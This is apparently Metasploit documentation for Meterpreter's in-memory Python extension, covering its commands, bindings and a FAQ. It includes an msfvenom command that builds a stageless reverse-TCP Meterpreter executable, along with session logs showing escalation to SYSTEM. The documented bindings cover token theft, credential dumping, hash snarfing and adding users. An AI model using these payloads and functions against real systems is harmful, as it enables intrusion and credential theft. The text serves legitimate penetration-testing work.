# Introduction

For quite some time, Meterpreter users have wanted the ability to run arbitrary scripts under the context of a session on the target machine. While Railgun gives coders the ability to execute arbitrary Win32 API calls, it doesn't really give them the ability to script the client in a single-shot.

Meterpreter now has a new extension that aims to solve this problem by providing a completely in-memory Python interpreter that can load scripts, run ad-hoc python commands, and also provides bindings to Meterpreter itself. The extension comes with many (but not _all_) of the built-in functionality you would expect to see in a running Python interpreter. This includes the likes of `ctypes` for easy automation of Win32-related functions. We've even taken steps to make this extension piggy-back onto `metsrv`'s copy of the SSL libraries in an effort to reduce the size of the resulting binary.

This page aims to document the features, show examples of how it can be used, and answer a few common questions that come up.

Unfortunately, at this point in time the extension only works inside x86 and x64 Meterpreters running on Windows targets. However, there are plans to enable this functionality on other implementations over time.

# Usage

As with any other extension that comes with Meterpreter, loading it is very simple:
```msf
meterpreter > use python
Loading extension python...success.
```
Once loaded, the help system shows the commands that come with the extension:
```msf
meterpreter > help

    ... snip ...

Python Commands
===============

    Command         Description
    -------         -----------
    python_execute  Execute a python command string
    python_import   Import/run a python file or module
    python_reset    Resets/restarts the Python interpreter
```

Each of these commands is discussed in detail below.

## python_execute

The `python_execute` command is the simplest of all commands that come with the extension, and provides the means to run single-shot lines of Python code, much in the same way that the normal Python interpreter functions from the command-line when using the `-c` switch. The full help for the command is as follows:
```msf
meterpreter > python_execute -h
Usage: python_execute <python code> [-r result var name]

Runs the given python string on the target. If a result is required,
it should be stored in a python variable, and that variable should
passed using the -r parameter.

OPTIONS:

    -h        Help banner
    -r <opt>  Name of the variable containing the result (optional)
```
A very simple example of this command is shown below:
```msf
meterpreter > python_execute "print 'Hi, from Meterpreter!'"
[+] Content written to stdout:
Hi, from Meterpreter!
```
Notice that any output that is written to stdout is captured by Meterpreter and returned to Metasploit so that it's visible to the user. This also happens for anything written to stderr, as shown below:
```msf
meterpreter > python_execute "x = x + 1"
[-] Content written to stderr:
Traceback (most recent call last):
  File "<string>", line 1, in <module>
NameError: name 'x' is not defined
```
This handy feature now only allows users to see the output of their scripts, but it also means that any errors are completely visible too.

A more interesting example can be seen below:
```msf
meterpreter > python_execute "x = [y for y in range(0, 20) if y % 5 == 0]"
[+] Command executed without returning a result
```
The command above executes, but nothing was printed to stdout, or to stderr, and hence nothing was captured.

The good thing is that the Python extension is persistent across calls. This means that after the above command is executed, `x` is still present in the interpreter and can be accessed with another call:
```msf
meterpreter > python_execute "print x"
[+] Content written to stdout:
[0, 5, 10, 15]
```
As useful as this is, developers may want to produce post-modules that make use of the data that a Python script has generated. Parsing stdout is not ideal in such a scenario, and hence this command provides the means for individual variables to be extracted directly using the `-r` parameter, as described by the help:
```msf
meterpreter > python_execute "x = [y for y in range(0, 20) if y % 5 == 0]" -r x
[+] x = [0, 5, 10, 15]
```
Note that this command requires the first parameter to be a string that contains code that needs to be executed. However, this string can be blank, resulting in no code being executed. This means that extraction of content generated in previous calls is still possible without executing more code, or rerunning previous code snippets just to make use of the `-r` parameter:
```msf
meterpreter > python_execute "" -r x
[+] x = [0, 5, 10, 15]
```
Behind the scenes, the result of the execution is a Ruby hash that contains all content written to stdout and stderr, and the content of the variable chosen using the `-r` parameter.

Sometimes, single-line execution isn't enough, or is cumbersome. The `python_import` command is provided to solve this problem and allow for scripts and modules to be loaded into the target from disk.

## python_import

This command allows for whole modules to be loaded from the attacker's machine an uploaded to the target interpreter. The full help is shown below:
```msf
meterpreter > python_import -h
Usage: python_import <-f file path> [-n mod name] [-r result var name]

Loads a python code file or module from disk into memory on the target.
The module loader requires a path to a folder that contains the module,
and the folder name will be used as the module name. Only .py files will
work with modules.

OPTIONS:

    -f <opt>  Path to the file (.py, .pyc), or module directory to import
    -h        Help banner
    -n <opt>  Name of the module (optional, for single files only)
    -r <opt>  Name of the variable containing the result (optional, single files only)
```
Importing of module trees is still considered a _beta_ feature, but we encourage you to use it where possible and keep us informed of any issues you may face.

Consider the following script:
```python
# $ cat /tmp/drives.py
import string
from ctypes import windll

def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.uppercase:
        if bitmask & 1:
            drives.append(letter)
        bitmask >>= 1

    return drives

result = get_drives()
print result
```
The aim of this is to determine all the local logical drives and put the letters into a list. From there it prints that list to screen. The result of running the script is as follows:
```msf
meterpreter > python_import -f /tmp/drives.py
[*] Importing /tmp/drives.py ...
[+] Content written to stdout:
['A', 'C', 'D', 'Z']
```
This shows that `ctypes` does indeed function correctly!

This command is also intended to allow for recursive loading of modules from the local attacker file system, however this feature is still not yet ready for prime time and work is still actively being done on this area.

## python_reset

It may get to a point where the content of the interpreter needs to be flushed. The `python_reset` command clears out all imports, libraries and global variables:
```msf
meterpreter > python_execute "x = 100"
[+] Command executed without returning a result
meterpreter > python_execute "print x"
[+] Content written to stdout:
100

meterpreter > python_reset
[+] Python interpreter successfully reset
meterpreter > python_execute "print x"
[-] Content written to stderr:
Traceback (most recent call last):
  File "<string>", line 1, in <module>
NameError: name 'x' is not defined
```

## Meterpreter Bindings

A number of bindings are available to the Python extension that allow for interaction with the Meterpreter instance itself. They are broken up into logical modules based on the functionality that they provide. Bindings are available for other extensions as well, and hence in order to use them, those extensions must be loaded. If an extension is not present, and error is thrown. As soon as an extension is loaded, the function should work. Each of the following subsections shows a module namespace that must be imported for that module to function correctly.

### Binding list

#### meterpreter.elevate

* `meterpreter.elevate.getsystem()` - maps directly to the `getsystem` command, however only attempts to use technique `1` because this is the only technique that doesn't require a binary to be uploaded.
* `meterpreter.elevate.rev2self()` - maps directly to the `rev2self` command.
* `meterpreter.elevate.steal_token(pid)` - provides the ability to steal a token from another process.
    * `pid` - the identifier of the process to steal the token from.
* `meterpreter.elevate.drop_token()` - drops the token that was stolen using `steal_token`.

#### meterpreter.extapi (requires the extapi extension)

Each of the following functions takes the following parameters:

* `domain_name` - the name of the domain that will be enumerated.
* `max_results` - maximum number of results (default `None`).
* `page_size` - the size of the results page (default `None`).

The full list of available functions is as follows:

* `meterpreter.extapi.adsi.enum_dcs(domain_name, max_results, page_size)` - enumerate the domain controllers on the given domain.
* `meterpreter.extapi.adsi.enum_users(domain_name, max_results, page_size)` - enumerate users on the given domain.
* `meterpreter.extapi.adsi.enum_group_users_nested(domain_name, group_dn, max_results, page_size)` - enumerate users in the given group recursively.
    * `group_dn` - The distinguished name of the group to enumerate.
* `meterpreter.extapi.adsi.enum_computers(domain_name, max_results, page_size)` - enumerate computers on the given domain.
* `meterpreter.extapi.adsi.domain_query(domain_name, query_filter, fields, max_results, page_size)` - provides a generic query mechanism to ADSI. All other functions in this library make use of this function.
    * `query_filter` - the LDAP-formatted query filter for the query.
    * `fields` - list of fields to extract from the query results.

#### meterpreter.fs

* `meterpreter.fs.show_mount()` - maps to the `show_mount` command and lists all logical drives on the target.

#### meterpreter.incognito (requires the incognito extension)

* `meterpreter.incognito.list_user_tokens()` - list all available user tokens.
* `meterpreter.incognito.list_group_tokens()` - list all available group tokens.
* `meterpreter.incognito.impersonate(user)` - impersonate the given user.
    * `user` - name of the user/group to impersonate in `DOMAIN\user` format.
* `meterpreter.incognito.snarf_hashes(server)` - run the `snarf_hashes` functionality using the specified server.
    * `server` - name of the server that is in place and ready to snarf the hashes.
* `meterpreter.incognito.add_user(server, username, password)` - add a user to the given server.
    * `server` - name of the server to use when adding the user.
    * `username` - name of the user to create.
    * `password` - password for the new user.
* `meterpreter.incognito.add_group_user(server, group, username)` - add a user to a group (domain).
    * `server` - name of the server to use when adding the user to a group.
    * `group` - name of the group to add the user to.
    * `username` - name of the user to add to the group.
* `meterpreter.incognito.add_localgroup_user(server, group, username)` - add a user to a group (local).
    * `server` - name of the server to use when adding the user to a group.
    * `group` - name of the group to add the user to.
    * `username` - name of the user to add to the group.

#### meterpreter.kiwi (requires the kiwi extension)

* `meterpreter.kiwi.creds_all()` - matches the `creds_all` command from the kiwi extension and returns a full list of all credentials that can be pulled from memory.

#### meterpreter.sys

* `meterpreter.sys.info()` - matches the `sysinfo` command and shows system information.
* `meterpreter.sys.ps_list()` - matches the `ps` command and lists the processes on the target.

#### meterpreter.transport

* `meterpreter.transport.list()` - list all transports in the target.
* `meterpreter.transport.add(url, session_expiry, comm_timeout, retry_total, retry_wait, ua, proxy_host, proxy_user, proxy_pass, cert_hash)` - allows for transports to be added to the Meterpreter session. All but the `url` parameter come with a sane default. Full details of each of these parameters can be found in the [[transport|meterpreter-transport-control]] documentation.

It is not possible to delete transports using the python extension as this opens the door to many kinds of failure.

#### meterpreter.user

* `meterpreter.user.getuid()` - gets the UID of the current session.
* `meterpreter.user.getsid()` - gets the SID of the current session.
* `meterpreter.user.is_system()` - determines if the current session is running as the `SYSTEM` user.

### Bindings example

```msf
meterpreter > getuid
Server username: WIN-TV01I7GG7JK\oj
meterpreter > python_execute "import meterpreter.user; print meterpreter.user.getuid()"
[+] Content written to stdout:
WIN-TV01I7GG7JK\oj

meterpreter > python_execute "import meterpreter.elevate; meterpreter.elevate.getsystem()"
[+] Command executed without returning a result
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > python_execute "meterpreter.elevate.rev2self(); print meterpreter.user.getuid()"
[+] Content written to stdout:
WIN-TV01I7GG7JK\oj

meterpreter > use incognito
Loading extension incognito...success.
meterpreter > python_execute "import meterpreter.incognito; print meterpreter.incognito.list_user_tokens()"
[+] Content written to stdout:
{'Delegation': ['NT AUTHORITY\\LOCAL SERVICE', 'NT AUTHORITY\\NETWORK SERVICE', 'NT AUTHORITY\\SYSTEM', 'WIN-TV01I7GG7JK\\oj'], 'Impersonation': ['NT AUTHORITY\\ANONYMOUS LOGON']}

meterpreter > python_execute "import meterpreter.fs; print meterpreter.fs.show_mount()"
[+] Content written to stdout:
[{'Name': 'A:\\', 'SpaceUser': None, 'SpaceTotal': None, 'UNC': None, 'SpaceFree': None, 'Type': 2}, {'Name': 'C:\\', 'SpaceUser': 28950585344L, 'SpaceTotal': 64422408192L, 'UNC': None, 'SpaceFree': 28950585344L, 'Type': 3}, {'Name': 'D:\\', 'SpaceUser': None, 'SpaceTotal': None, 'UNC': None, 'SpaceFree': None, 'Type': 5}]
```
Each of the examples above just show the results printed to stdout, however the values are returned as Python dictionaries and can be operated on just like normal variables.

## Stageless Initialisation

Not only can the extension be baked into a stageless Meterpreter, like any other extension, it also has the ability to run an arbitrary script before the Meterpreter session is even established! Consider the following script:
```
$  cat /tmp/met.py
import meterpreter.transport
meterpreter.transport.add("tcp://127.0.0.1:8000")
```
This is a simple script that uses the Meterpreter bindings to add a new transport to the list of transports. This is executed immediately before Meterpreter attempts to create a connection back to Metasploit for the first time. The intent is to show that it's possible to add any number of transports on startup.

To create a stageless payload that uses this script, we can make use of the `EXTINIT` parameter in `msfvenom`:
```
$ msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4445 EXTENSIONS=stdapi,priv,python EXTINIT=python,/tmp/met.py -f exe -o /tmp/met-stageless.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 6412437 bytes
Saved as: /tmp/met-stageless.exe
```
When this payload is executed, the transport is added and shown to be present in the transport list immediately:
```msf
msf exploit(handler) > [*] Meterpreter session 2 opened (172.16.52.1:4445 -> 172.16.52.247:49159) at 2015-12-13 11:06:54 +1000

msf exploit(handler) > sessions -i -1
[*] Starting interaction with 2...

meterpreter > transport list
Session Expiry  : @ 2015-12-20 11:06:52

    ID  Curr  URL                     Comms T/O  Retry Total  Retry Wait
    --  ----  ---                     ---------  -----------  ----------
    1         tcp://127.0.0.1:8000    300        3600         10
    2   *     tcp://172.16.52.1:4445  300        3600         10
```
This stageless initialisation feature allows for long-running Python scripts to be run before Meterpreter even calls home. This is really handy in so many ways, so get creative and show us how awesome this can be.

## FAQ

> Does the extension do dynamic resolution of Python libraries at runtime?

Yes. The extension has a built-in import handler that loads modules from memory. This includes modules that the user has dynamically loaded using the `python_import` command. If a module doesn't exist as part of the extension then resolution will fail. Down the track we may look into extending this feature so that missing libraries are uploaded on-the-fly when an import fails, but it's not known when this work will get done.

> When will this extension be available for other Meterpreters?

We're not yet able to put a timeline on this.

> Is it possible to use the Python extension to run Responder?

Unfortunately, no it is not. Responder makes the assumption that port `445` is available for use on the target, which is why it functions nicely on \*nix systems that don't make use of this port by default. On Windows systems, port `445` is already in use by system services and hence can't be bound to.

There is a Powershell-based project that aims to do the same thing as Responder, and that is called [Inveigh][]. This utility piggy-backs of the existing SMB service, and appears to do quite a good job of stealing hashes, so it's recommended that this be used instead.

> Is it perfect?

Hell no! But the goal is to get closer and closer to perfect as we go. It's up to you to help us improve it along the way by using it in interesting ways, and submitting bugs when it breaks.

> Can I suggest a feature?

Please do, making good use of the Github issues feature. Better still, create a PR for one!

  [inveigh]: https://github.com/Kevin-Robertson/Inveigh

## Currently Loadable Native Libraries

```
__future__
__phello__
_abcoll
_osx_support
_pyio
_strptime
_threading_local
_weakrefset
abc
aifc
antigravity
argparse
asynchat
asyncore
atexit
audiodev
base64
BaseHTTPServer
Bastion
bdb
binhex
bisect
calendar
cgi
CGIHTTPServer
cgitb
chunk
cmd
code
codecs
codeop
collections
colorsys
commands
compileall
compiler
compiler.ast
compiler.consts
compiler.future
compiler.misc
compiler.pyassem
compiler.pycodegen
compiler.symbols
compiler.syntax
compiler.transformer
compiler.visitor
ConfigParser
contextlib
Cookie
cookielib
copy
copy_reg
cProfile
csv
ctypes
ctypes._endian
ctypes.util
ctypes.wintypes
decimal
difflib
dircache
dis
DocXMLRPCServer
dummy_thread
dummy_threading
email
email._parseaddr
email.base64mime
email.charset
email.encoders
email.errors
email.feedparser
email.generator
email.header
email.iterators
email.message
email.parser
email.quoprimime
email.utils
email.mime
email.mime.application
email.mime.audio
email.mime.base
email.mime.image
email.mime.message
email.mime.multipart
email.mime.nonmultipart
email.mime.text
encodings
encodings.aliases
encodings.ascii
encodings.base64_codec
encodings.charmap
encodings.cp037
encodings.cp1006
encodings.cp1026
encodings.cp1140
encodings.cp1250
encodings.cp1251
encodings.cp1252
encodings.cp1253
encodings.cp1254
encodings.cp1255
encodings.cp1256
encodings.cp1257
encodings.cp1258
encodings.cp424
encodings.cp437
encodings.cp500
encodings.cp720
encodings.cp737
encodings.cp775
encodings.cp850
encodings.cp852
encodings.cp855
encodings.cp856
encodings.cp857
encodings.cp858
encodings.cp860
encodings.cp861
encodings.cp862
encodings.cp863
encodings.cp864
encodings.cp865
encodings.cp866
encodings.cp869
encodings.cp874
encodings.cp875
encodings.hex_codec
encodings.hp_roman8
encodings.idna
encodings.iso8859_1
encodings.iso8859_10
encodings.iso8859_11
encodings.iso8859_13
encodings.iso8859_14
encodings.iso8859_15
encodings.iso8859_16
encodings.iso8859_2
encodings.iso8859_3
encodings.iso8859_4
encodings.iso8859_5
encodings.iso8859_6
encodings.iso8859_7
encodings.iso8859_8
encodings.iso8859_9
encodings.koi8_r
encodings.koi8_u
encodings.latin_1
encodings.mac_arabic
encodings.mac_centeuro
encodings.mac_croatian
encodings.mac_cyrillic
encodings.mac_farsi
encodings.mac_greek
encodings.mac_iceland
encodings.mac_latin2
encodings.mac_roman
encodings.mac_romanian
encodings.mac_turkish
encodings.mbcs
encodings.palmos
encodings.ptcp154
encodings.punycode
encodings.quopri_codec
encodings.raw_unicode_escape
encodings.rot_13
encodings.string_escape
encodings.tis_620
encodings.undefined
encodings.unicode_escape
encodings.unicode_internal
encodings.utf_16
encodings.utf_16_be
encodings.utf_16_le
encodings.utf_32
encodings.utf_32_be
encodings.utf_32_le
encodings.utf_7
encodings.utf_8
encodings.utf_8_sig
encodings.uu_codec
encodings.zlib_codec
filecmp
fileinput
fnmatch
formatter
fpformat
fractions
ftplib
functools
genericpath
getopt
getpass
gettext
glob
gzip
hashlib
heapq
hmac
htmlentitydefs
htmllib
HTMLParser
httplib
ihooks
imaplib
imghdr
importlib
imputil
inspect
io
json
json.decoder
json.encoder
json.scanner
json.tool
keyword
linecache
locale
logging
logging.config
logging.handlers
macpath
macurl2path
mailbox
mailcap
markupbase
md5
meterpreter
meterpreter.core
meterpreter.elevate
meterpreter.fs
meterpreter.incognito
meterpreter.kiwi
meterpreter.sys
meterpreter.tlv
meterpreter.transport
meterpreter.user
meterpreter.extapi
meterpreter.extapi.adsi
mhlib
mimetools
mimetypes
MimeWriter
modulefinder
multifile
multiprocessing
multiprocessing.connection
multiprocessing.forking
multiprocessing.heap
multiprocessing.managers
multiprocessing.pool
multiprocessing.process
multiprocessing.queues
multiprocessing.reduction
multiprocessing.sharedctypes
multiprocessing.synchronize
multiprocessing.util
multiprocessing.dummy
multiprocessing.dummy.connection
mutex
netrc
new
nntplib
ntpath
nturl2path
numbers
opcode
optparse
os
os2emxpath
pdb
pickle
pickletools
pipes
pkgutil
platform
plistlib
popen2
poplib
posixfile
posixpath
pprint
profile
pstats
py_compile
pyclbr
pydoc
Queue
quopri
random
re
repr
rexec
rfc822
rlcompleter
robotparser
runpy
sched
sets
sgmllib
sha
shelve
shlex
shutil
SimpleHTTPServer
SimpleXMLRPCServer
site
smtplib
sndhdr
socket
SocketServer
sre
sre_compile
sre_constants
sre_parse
ssl
stat
statvfs
string
StringIO
stringold
stringprep
struct
subprocess
sunau
sunaudio
symbol
symtable
sysconfig
tabnanny
tarfile
telnetlib
tempfile
textwrap
this
threading
timeit
toaiff
token
tokenize
trace
traceback
types
urllib
urllib2
urlparse
user
UserDict
UserList
UserString
uu
uuid
warnings
wave
weakref
webbrowser
whichdb
wsgiref
wsgiref.handlers
wsgiref.headers
wsgiref.simple_server
wsgiref.util
wsgiref.validate
xdrlib
xml
xml.dom
xml.dom.domreg
xml.dom.expatbuilder
xml.dom.minicompat
xml.dom.minidom
xml.dom.NodeFilter
xml.dom.pulldom
xml.dom.xmlbuilder
xml.etree
xml.etree.ElementInclude
xml.etree.ElementPath
xml.etree.ElementTree
xml.parsers
xml.sax
xml.sax._exceptions
xml.sax.handler
xml.sax.saxutils
xml.sax.xmlreader
xmllib
xmlrpclib
zipfile
```
